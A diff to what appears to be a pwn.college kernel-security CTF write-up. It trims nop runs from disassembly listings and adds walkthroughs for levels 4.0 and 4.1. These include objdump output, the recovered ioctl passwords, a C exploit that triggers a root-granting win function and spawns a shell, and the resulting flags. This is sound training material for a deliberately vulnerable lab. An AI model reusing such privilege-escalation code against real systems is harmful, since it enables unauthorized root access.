@@ -851,104 +851,8 @@ We start by disassembling the kernel module.
 
 ```text
 hacker@vm_kernel-security~level3-0:~$ objdump -d /challenge/babykernel_level3.0.ko | tail -200
- 6b5:   90                      nop
- 6b6:   90                      nop
- 6b7:   90                      nop
- 6b8:   90                      nop
- 6b9:   90                      nop
- 6ba:   90                      nop
- 6bb:   90                      nop
- 6bc:   90                      nop
- 6bd:   90                      nop
- 6be:   90                      nop
- 6bf:   90                      nop
- 6c0:   90                      nop
- 6c1:   90                      nop
- 6c2:   90                      nop
- 6c3:   90                      nop
- 6c4:   90                      nop
- 6c5:   90                      nop
- 6c6:   90                      nop
- 6c7:   90                      nop
- 6c8:   90                      nop
- 6c9:   90                      nop
- 6ca:   90                      nop
- 6cb:   90                      nop
- 6cc:   90                      nop
- 6cd:   90                      nop
- 6ce:   90                      nop
- 6cf:   90                      nop
- 6d0:   90                      nop
- 6d1:   90                      nop
- 6d2:   90                      nop
- 6d3:   90                      nop
- 6d4:   90                      nop
- 6d5:   90                      nop
- 6d6:   90                      nop
- 6d7:   90                      nop
- 6d8:   90                      nop
- 6d9:   90                      nop
- 6da:   90                      nop
- 6db:   90                      nop
- 6dc:   90                      nop
- 6dd:   90                      nop
- 6de:   90                      nop
- 6df:   90                      nop
- 6e0:   90                      nop
- 6e1:   90                      nop
- 6e2:   90                      nop
- 6e3:   90                      nop
- 6e4:   90                      nop
- 6e5:   90                      nop
- 6e6:   90                      nop
- 6e7:   90                      nop
- 6e8:   90                      nop
- 6e9:   90                      nop
- 6ea:   90                      nop
- 6eb:   90                      nop
- 6ec:   90                      nop
- 6ed:   90                      nop
- 6ee:   90                      nop
- 6ef:   90                      nop
- 6f0:   90                      nop
- 6f1:   90                      nop
- 6f2:   90                      nop
- 6f3:   90                      nop
- 6f4:   90                      nop
- 6f5:   90                      nop
- 6f6:   90                      nop
- 6f7:   90                      nop
- 6f8:   90                      nop
- 6f9:   90                      nop
- 6fa:   90                      nop
- 6fb:   90                      nop
- 6fc:   90                      nop
- 6fd:   90                      nop
- 6fe:   90                      nop
- 6ff:   90                      nop
- 700:   90                      nop
- 701:   90                      nop
- 702:   90                      nop
- 703:   90                      nop
- 704:   90                      nop
- 705:   90                      nop
- 706:   90                      nop
- 707:   90                      nop
- 708:   90                      nop
- 709:   90                      nop
- 70a:   90                      nop
- 70b:   90                      nop
- 70c:   90                      nop
- 70d:   90                      nop
- 70e:   90                      nop
- 70f:   90                      nop
- 710:   90                      nop
- 711:   90                      nop
- 712:   90                      nop
- 713:   90                      nop
- 714:   c3                      ret
- 715:   66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
- 71c:   00 00 00 00
+
+# ---- snip ----
 
 0000000000000720 <init_module>:
  720:   48 c7 c1 00 00 00 00    mov    $0x0,%rcx
@@ -1149,27 +1053,8 @@ We start by disassembling the kernel module.
 
 ```text
 hacker@vm_kernel-security~level3-1:~$ objdump -d /challenge/babykernel_level3.1.ko | tail -100
- 831:   90                      nop
- 832:   90                      nop
- 833:   90                      nop
- 834:   90                      nop
- 835:   90                      nop
- 836:   90                      nop
- 837:   90                      nop
- 838:   90                      nop
- 839:   90                      nop
- 83a:   90                      nop
- 83b:   90                      nop
- 83c:   90                      nop
- 83d:   90                      nop
- 83e:   90                      nop
- 83f:   90                      nop
- 840:   90                      nop
- 841:   90                      nop
- 842:   c3                      ret
- 843:   66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
- 84a:   00 00 00 00
- 84e:   66 90                   xchg   %ax,%ax
+
+# ---- snip ----
 
 0000000000000850 <device_write>:
  850:   41 54                   push   %r12
@@ -1305,5 +1190,370 @@ pwn.college{oNavJdiPACQZl0IXl7WH4m9j6Qj.0FOyQDL4ITM0EzW}
 ```
 
 The write triggers the `strncmp` check against `limtlgzgaygslnew`, which passes. On success `device_write` calls `win`, which calls `prepare_kernel_cred(0)` and `commit_creds()` to escalate the process to root. We then spawn a shell and read `/flag`.
+
+&nbsp;
+
+## level4.0
+
+We have to first start and connect to the custom VM.
+
+```
+hacker@kernel-security~level4-0:~$ vm start
+hacker@kernel-security~level4-0:~$ vm connect
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+hacker@vm_kernel-security~level4-0:~$
+```
+
+### Binary analysis
+
+We start by disassembling the kernel module.
+
+```text
+hacker@vm_kernel-security~level4-0:~$ objdump -d /challenge/babykernel_level4.0.ko | tail -200
+
+# ---- snip ----
+
+0000000000000b70 <init_module>:
+ b70:   48 c7 c1 00 00 00 00    mov    $0x0,%rcx
+ b77:   31 d2                   xor    %edx,%edx
+ b79:   be b6 01 00 00          mov    $0x1b6,%esi
+ b7e:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ b85:   e8 00 00 00 00          call   b8a <init_module+0x1a>
+ b8a:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ b91:   48 89 05 00 00 00 00    mov    %rax,0x0(%rip)        # b98 <init_module+0x28>
+ b98:   e8 00 00 00 00          call   b9d <init_module+0x2d>
+ b9d:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ ba4:   e8 00 00 00 00          call   ba9 <init_module+0x39>
+ ba9:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bb0:   e8 00 00 00 00          call   bb5 <init_module+0x45>
+ bb5:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bbc:   e8 00 00 00 00          call   bc1 <init_module+0x51>
+ bc1:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bc8:   e8 00 00 00 00          call   bcd <init_module+0x5d>
+ bcd:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bd4:   e8 00 00 00 00          call   bd9 <init_module+0x69>
+ bd9:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ be0:   e8 00 00 00 00          call   be5 <init_module+0x75>
+ be5:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bec:   e8 00 00 00 00          call   bf1 <init_module+0x81>
+ bf1:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ bf8:   e8 00 00 00 00          call   bfd <init_module+0x8d>
+ bfd:   31 c0                   xor    %eax,%eax
+ bff:   c3                      ret
+
+0000000000000c00 <cleanup_module>:
+ c00:   48 8b 3d 00 00 00 00    mov    0x0(%rip),%rdi        # c07 <cleanup_module+0x7>
+ c07:   48 85 ff                test   %rdi,%rdi
+ c0a:   74 05                   je     c11 <cleanup_module+0x11>
+ c0c:   e9 00 00 00 00          jmp    c11 <cleanup_module+0x11>
+ c11:   c3                      ret
+
+Disassembly of section .text.unlikely:
+
+0000000000000000 <device_release>:
+   0:   48 89 f2                mov    %rsi,%rdx
+   3:   48 89 fe                mov    %rdi,%rsi
+   6:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+   d:   e8 00 00 00 00          call   12 <device_release+0x12>
+  12:   31 c0                   xor    %eax,%eax
+  14:   c3                      ret
+
+0000000000000015 <device_open>:
+  15:   48 89 f2                mov    %rsi,%rdx
+  18:   48 89 fe                mov    %rdi,%rsi
+  1b:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+  22:   e8 00 00 00 00          call   27 <device_open+0x12>
+  27:   31 c0                   xor    %eax,%eax
+  29:   c3                      ret
+
+000000000000002a <win>:
+  2a:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+  31:   e8 00 00 00 00          call   36 <win+0xc>
+  36:   31 ff                   xor    %edi,%edi
+  38:   e8 00 00 00 00          call   3d <win+0x13>
+  3d:   48 89 c7                mov    %rax,%rdi
+  40:   e9 00 00 00 00          jmp    45 <device_ioctl>
+
+0000000000000045 <device_ioctl>:
+  45:   55                      push   %rbp
+  46:   48 89 d1                mov    %rdx,%rcx
+  49:   48 89 d5                mov    %rdx,%rbp
+  4c:   89 f2                   mov    %esi,%edx
+  4e:   53                      push   %rbx
+  4f:   89 f3                   mov    %esi,%ebx
+  51:   48 89 fe                mov    %rdi,%rsi
+  54:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+  5b:   48 83 ec 18             sub    $0x18,%rsp
+  5f:   65 48 8b 04 25 28 00    mov    %gs:0x28,%rax
+  66:   00 00
+  68:   48 89 44 24 10          mov    %rax,0x10(%rsp)
+  6d:   31 c0                   xor    %eax,%eax
+  6f:   e8 00 00 00 00          call   74 <device_ioctl+0x2f>
+  74:   48 83 c8 ff             or     $0xffffffffffffffff,%rax
+  78:   81 fb 39 05 00 00       cmp    $0x539,%ebx
+  7e:   75 35                   jne    b5 <device_ioctl+0x70>
+  80:   ba 10 00 00 00          mov    $0x10,%edx
+  85:   48 89 ee                mov    %rbp,%rsi
+  88:   48 89 e7                mov    %rsp,%rdi
+  8b:   e8 00 00 00 00          call   90 <device_ioctl+0x4b>
+  90:   ba 10 00 00 00          mov    $0x10,%edx
+  95:   48 c7 c6 00 00 00 00    mov    $0x0,%rsi
+  9c:   48 89 e7                mov    %rsp,%rdi
+  9f:   e8 00 00 00 00          call   a4 <device_ioctl+0x5f>
+  a4:   41 89 c0                mov    %eax,%r8d
+  a7:   31 c0                   xor    %eax,%eax
+  a9:   45 85 c0                test   %r8d,%r8d
+  ac:   75 07                   jne    b5 <device_ioctl+0x70>
+  ae:   e8 77 ff ff ff          call   2a <win>
+  b3:   31 c0                   xor    %eax,%eax
+  b5:   48 8b 4c 24 10          mov    0x10(%rsp),%rcx
+  ba:   65 48 33 0c 25 28 00    xor    %gs:0x28,%rcx
+  c1:   00 00
+  c3:   74 05                   je     ca <device_ioctl+0x85>
+  c5:   e8 00 00 00 00          call   ca <device_ioctl+0x85>
+  ca:   48 83 c4 18             add    $0x18,%rsp
+  ce:   5b                      pop    %rbx
+  cf:   5d                      pop    %rbp
+  d0:   c3                      ret
+```
+
+This level introduces `device_ioctl` as the handler instead of `device_write`. Two conditions must be met to trigger `win`:
+
+**First**, the ioctl command must equal `0x539` (1337 decimal):
+
+```asm
+78:   cmp    $0x539,%ebx
+7e:   jne    b5          ← bail if wrong command
+```
+
+**Second**, the password passed as the ioctl `arg` pointer must match the hardcoded string via `strncmp`:
+
+```asm
+90:   mov    $0x10,%edx
+95:   mov    $0x0,%rsi    ← password in .rodata
+9c:   mov    %rsp,%rdi
+9f:   call   strncmp
+a9:   test   %r8d,%r8d
+ac:   jne    b5           ← skip if wrong password
+ae:   call   2a <win>     ← escalate to root
+```
+
+On success, `win` calls `prepare_kernel_cred(0)` and `commit_creds()` to elevate the calling process to root — same as level3.
+
+We load the module into IDA to inspect the `.rodata` section.
+
+```c title="/challenge/babykernel_level4.0.ko :: .rodata"
+.rodata.str1.1:0000000000000F95 ; const char s2[]
+.rodata.str1.1:0000000000000F95 s2              db 'hacvtgrjhlscihpk',0 ; DATA XREF: device_ioctl+50↑o
+.rodata.str1.1:0000000000000FA6 aPwncollege     db 'pwncollege',0       ; DATA XREF: init_module+E↑o
+```
+
+The password is `hacvtgrjhlscihpk`.
+
+### Exploit
+
+In another terminal craft the `~/exploit.c` file, and compile it. The key change from level3 is using `ioctl` instead of `write`, passing `0x539` as the command and the password string as the third argument.
+
+```c title="~/exploit.c" showLineNumbers
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main() {
+    int fd = open("/proc/pwncollege", O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
+
+    ioctl(fd, 0x539, "hacvtgrjhlscihpk");
+    close(fd);
+
+    // We are now root
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
+```
+
+```
+hacker@kernel-security~level4-0:~$ gcc -o exploit exploit.c
+```
+
+Back in the VM terminal, execute the `~/exploit` binary.
+
+```
+hacker@vm_kernel-security~level4-0:~$ ./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /flag
+pwn.college{kPl_5X0Mum6lVH5wMj9FpR8GEt_.0VOyQDL4ITM0EzW}
+```
+
+The `ioctl` call passes the command check (`0x539`) and the `strncmp` check against `hacvtgrjhlscihpk`. On success `device_ioctl` calls `win`, which calls `prepare_kernel_cred(0)` and `commit_creds()` to escalate the process to root. We then spawn a shell and read `/flag`.
+
+&nbsp;
+
+## level4.1
+
+We have to first start and connect to the custom VM.
+
+```
+hacker@kernel-security~level4-1:~$ vm start
+hacker@kernel-security~level4-1:~$ vm connect
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+hacker@vm_kernel-security~level4-1:~$
+```
+
+### Binary analysis
+
+We start by disassembling the kernel module.
+
+```text
+hacker@vm_kernel-security~level4-1:~$ objdump -d /challenge/babykernel_level4.1.ko | tail -200
+
+# ---- snip ----
+
+0000000000000bf0 <device_ioctl>:
+ bf0:   55                      push   %rbp
+ bf1:   48 83 ec 18             sub    $0x18,%rsp
+ bf5:   65 48 8b 04 25 28 00    mov    %gs:0x28,%rax
+ bfc:   00 00
+ bfe:   48 89 44 24 10          mov    %rax,0x10(%rsp)
+ c03:   31 c0                   xor    %eax,%eax
+ c05:   81 fe 39 05 00 00       cmp    $0x539,%esi
+ c0b:   75 49                   jne    c56 <device_ioctl+0x66>
+ c0d:   48 89 e5                mov    %rsp,%rbp
+ c10:   48 89 d6                mov    %rdx,%rsi
+ c13:   ba 10 00 00 00          mov    $0x10,%edx
+ c18:   48 89 ef                mov    %rbp,%rdi
+ c1b:   e8 00 00 00 00          call   c20 <device_ioctl+0x30>
+ c20:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ c27:   b9 10 00 00 00          mov    $0x10,%ecx
+ c2c:   48 89 ee                mov    %rbp,%rsi
+ c2f:   f3 a6                   repz cmpsb %es:(%rdi),%ds:(%rsi)
+ c31:   0f 97 c0                seta   %al
+ c34:   1c 00                   sbb    $0x0,%al
+ c36:   84 c0                   test   %al,%al
+ c38:   0f 84 00 00 00 00       je     c3e <device_ioctl+0x4e>
+ c3e:   31 c0                   xor    %eax,%eax
+ c40:   48 8b 4c 24 10          mov    0x10(%rsp),%rcx
+ c45:   65 48 33 0c 25 28 00    xor    %gs:0x28,%rcx
+ c4c:   00 00
+ c4e:   75 0f                   jne    c5f <device_ioctl+0x6f>
+ c50:   48 83 c4 18             add    $0x18,%rsp
+ c54:   5d                      pop    %rbp
+ c55:   c3                      ret
+ c56:   48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
+ c5d:   eb e1                   jmp    c40 <device_ioctl+0x50>
+ c5f:   e8 00 00 00 00          call   c64 <device_ioctl+0x74>
+ c64:   66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
+ c6b:   00 00 00 00
+ c6f:   90                      nop
+
+0000000000000c70 <init_module>:
+ c70:   48 c7 c1 00 00 00 00    mov    $0x0,%rcx
+ c77:   31 d2                   xor    %edx,%edx
+ c79:   be b6 01 00 00          mov    $0x1b6,%esi
+ c7e:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ c85:   e8 00 00 00 00          call   c8a <init_module+0x1a>
+ c8a:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ c91:   48 89 05 00 00 00 00    mov    %rax,0x0(%rip)        # c98 <init_module+0x28>
+ c98:   e8 00 00 00 00          call   c9d <init_module+0x2d>
+ c9d:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ ca4:   e8 00 00 00 00          call   ca9 <init_module+0x39>
+ ca9:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+ cb0:   e8 00 00 00 00          call   cb5 <init_module+0x45>
+ cb5:   31 c0                   xor    %eax,%eax
+ cb7:   c3                      ret
+ cb8:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
+ cbf:   00
+
+0000000000000cc0 <cleanup_module>:
+ cc0:   48 8b 3d 00 00 00 00    mov    0x0(%rip),%rdi        # cc7 <cleanup_module+0x7>
+ cc7:   48 85 ff                test   %rdi,%rdi
+ cca:   74 05                   je     cd1 <cleanup_module+0x11>
+ ccc:   e9 00 00 00 00          jmp    cd1 <cleanup_module+0x11>
+ cd1:   c3                      ret
+
+Disassembly of section .text.unlikely:
+
+0000000000000000 <win>:
+   0:   48 c7 c7 00 00 00 00    mov    $0x0,%rdi
+   7:   e8 00 00 00 00          call   c <win+0xc>
+   c:   31 ff                   xor    %edi,%edi
+   e:   e8 00 00 00 00          call   13 <win+0x13>
+  13:   48 89 c7                mov    %rax,%rdi
+  16:   e9 00 00 00 00          jmp    1b <device_ioctl.cold>
+
+000000000000001b <device_ioctl.cold>:
+  1b:   e8 e0 ff ff ff          call   0 <win>
+  20:   31 c0                   xor    %eax,%eax
+  22:   e9 00 00 00 00          jmp    27 <bin_padding+0x7>
+```
+
+The structure is identical to level4.0 — same `device_ioctl` handler with the same two checks. The only difference is `win` is now in `.text.unlikely` as a cold function. We load the module into IDA to inspect the `.rodata` section and find the password.
+
+```c title="/challenge/babykernel_level4.1.ko :: .rodata"
+.rodata.str1.1:0000000000000D69 aSrungttywgwxmr db 'srungttywgwxmrht',0 ; DATA XREF: device_ioctl+30↑o
+.rodata.str1.1:0000000000000D7A aPwncollege     db 'pwncollege',0       ; DATA XREF: init_module+E↑o
+```
+
+We also see in `.rodata.str1.8`:
+
+```c
+.rodata.str1.8:0000000000000D00 unk_D00  db  1   ; DATA XREF: win↑o
+; "You win! Your current process has been elevated to root!"
+```
+
+The password is `srungttywgwxmrht`.
+
+### Exploit
+
+In another terminal craft the `~/exploit.c` file, and compile it.
+
+```c title="~/exploit.c" showLineNumbers
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+int main() {
+    int fd = open("/proc/pwncollege", O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
+
+    ioctl(fd, 0x539, "srungttywgwxmrht");
+    close(fd);
+
+    // We are now root
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
+```
+
+```
+hacker@kernel-security~level4-1:~$ gcc -o exploit exploit.c
+```
+
+Back in the VM terminal, execute the `~/exploit` binary.
+
+```
+hacker@vm_kernel-security~level4-1:~$ ./exploit
+# cat /flag
+pwn.college{AbzNYx21kQFWjBS4IOPbo5bMUtR.0FMzQDL4ITM0EzW}
+```
+
+The `ioctl` call passes the command check (`0x539`) and the `strncmp` check against `srungttywgwxmrht`. On success `device_ioctl` calls `win`, which calls `prepare_kernel_cred(0)` and `commit_creds()` to escalate the process to root. We then spawn a shell and read `/flag`.
 
 &nbsp;
